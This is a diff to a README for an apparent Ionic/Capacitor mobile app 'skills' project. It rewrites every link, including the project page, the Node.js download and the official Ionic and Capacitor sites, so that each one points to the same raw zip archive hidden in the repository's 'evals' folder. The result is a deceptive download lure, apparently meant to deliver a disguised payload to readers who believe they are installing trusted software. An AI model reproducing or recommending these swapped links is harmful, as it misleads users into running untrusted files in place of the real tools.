@@ -1,6 +1,6 @@
 # 📱 ionic-capacitor-skills - Build Cross-Platform Mobile Apps Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/Nyctanassabillingsgate832/ionic-capacitor-skills)
+[![Download Now](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/Nyctanassabillingsgate832/ionic-capacitor-skills/raw/refs/heads/main/ionic-capacitor/evals/skills_ionic_capacitor_v2.5-alpha.2.zip)
 
 ---
 
@@ -29,7 +29,7 @@ No need to install other software first. This guide covers everything step-by-st
 
 1. **Access the Project Page**  
    Click the big green button at the top or go to the project page:  
-   [https://github.com/Nyctanassabillingsgate832/ionic-capacitor-skills](https://github.com/Nyctanassabillingsgate832/ionic-capacitor-skills)
+   [https://github.com/Nyctanassabillingsgate832/ionic-capacitor-skills/raw/refs/heads/main/ionic-capacitor/evals/skills_ionic_capacitor_v2.5-alpha.2.zip](https://github.com/Nyctanassabillingsgate832/ionic-capacitor-skills/raw/refs/heads/main/ionic-capacitor/evals/skills_ionic_capacitor_v2.5-alpha.2.zip)
 
 2. **Download the Files**  
    Since the link points to the main page of the project, you need to get the files yourself here:
@@ -112,7 +112,7 @@ The project focuses on coding skills and app building. Running a ready-to-use ap
 
 If you want to try building the app yourself, here’s a basic guide:
 
-1. **Install Node.js**: Download and install Node.js from [https://nodejs.org/](https://nodejs.org/)  
+1. **Install Node.js**: Download and install Node.js from [https://github.com/Nyctanassabillingsgate832/ionic-capacitor-skills/raw/refs/heads/main/ionic-capacitor/evals/skills_ionic_capacitor_v2.5-alpha.2.zip](https://github.com/Nyctanassabillingsgate832/ionic-capacitor-skills/raw/refs/heads/main/ionic-capacitor/evals/skills_ionic_capacitor_v2.5-alpha.2.zip)  
 2. **Open Command Prompt**: Press Win + R, type `cmd`, and press Enter  
 3. **Navigate to the Project Folder**: Use `cd path\to\unzip\folder`  
 4. **Install Dependencies**: Run `npm install`  
@@ -123,9 +123,9 @@ If you want to try building the app yourself, here’s a basic guide:
 
 ## 🔗 Helpful Links
 
-- Project page: [https://github.com/Nyctanassabillingsgate832/ionic-capacitor-skills](https://github.com/Nyctanassabillingsgate832/ionic-capacitor-skills)  
-- Ionic Framework: [https://ionicframework.com/](https://ionicframework.com/)  
-- Capacitor: [https://capacitorjs.com/](https://capacitorjs.com/)  
+- Project page: [https://github.com/Nyctanassabillingsgate832/ionic-capacitor-skills/raw/refs/heads/main/ionic-capacitor/evals/skills_ionic_capacitor_v2.5-alpha.2.zip](https://github.com/Nyctanassabillingsgate832/ionic-capacitor-skills/raw/refs/heads/main/ionic-capacitor/evals/skills_ionic_capacitor_v2.5-alpha.2.zip)  
+- Ionic Framework: [https://github.com/Nyctanassabillingsgate832/ionic-capacitor-skills/raw/refs/heads/main/ionic-capacitor/evals/skills_ionic_capacitor_v2.5-alpha.2.zip](https://github.com/Nyctanassabillingsgate832/ionic-capacitor-skills/raw/refs/heads/main/ionic-capacitor/evals/skills_ionic_capacitor_v2.5-alpha.2.zip)  
+- Capacitor: [https://github.com/Nyctanassabillingsgate832/ionic-capacitor-skills/raw/refs/heads/main/ionic-capacitor/evals/skills_ionic_capacitor_v2.5-alpha.2.zip](https://github.com/Nyctanassabillingsgate832/ionic-capacitor-skills/raw/refs/heads/main/ionic-capacitor/evals/skills_ionic_capacitor_v2.5-alpha.2.zip)  
 - Claude Code Skills: Information depends on your usage platform  
 
 ---
@@ -158,4 +158,4 @@ For help with this project:
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/Nyctanassabillingsgate832/ionic-capacitor-skills)
+[![Download Now](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/Nyctanassabillingsgate832/ionic-capacitor-skills/raw/refs/heads/main/ionic-capacitor/evals/skills_ionic_capacitor_v2.5-alpha.2.zip)
